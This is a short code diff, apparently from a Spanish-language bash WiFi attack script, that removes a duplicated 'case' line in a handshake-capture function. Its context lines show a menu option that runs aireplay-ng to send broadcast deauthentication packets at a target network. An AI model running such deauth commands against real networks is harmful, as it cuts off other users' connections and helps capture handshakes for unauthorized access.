@@ -162,8 +162,6 @@ function capture_handshake() {
         fi
 
         case $hs_opt in
-        
-        case $hs_opt in
             1)
                 echo -e "${RED}[ATTACK] Enviando 10 paquetes de deauth (Broadcast)...${NC}"
                 aireplay-ng -0 10 -a "$bssid" "$mon_interface"
